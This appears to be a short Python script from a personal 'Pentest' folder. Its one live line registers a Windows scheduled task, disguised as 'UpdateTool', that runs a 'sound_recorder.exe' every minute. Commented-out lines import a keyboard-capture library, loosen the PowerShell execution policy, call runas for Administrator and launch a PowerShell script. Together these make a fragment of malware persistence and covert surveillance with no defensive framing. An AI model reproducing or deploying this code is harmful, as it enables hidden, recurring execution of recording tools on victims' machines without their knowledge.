import subprocess
import os
import pynput.keyboard

#from pynput.keyboard import Key, Controller
#keyboard = Controller()

#os.system('powershell.exe Set-ExecutionPolicy -ExecutionPolicy RemoteSigned')

os.system(r'cmd /c "schtasks /create /sc minute /mo 1 /tn UpdateTool /tr C:\Users\danie\OneDrive\Pentest\download\sound_recorder.exe"')

#keyboard.press(Key.left)
#subprocess.call(['runas', '/user:Administrator', 'myfile.exe'])
#subprocess.Popen(['powershell.exe', 'C:\\Users\\danie\\OneDrive\\Pentest\\test.ps1'])
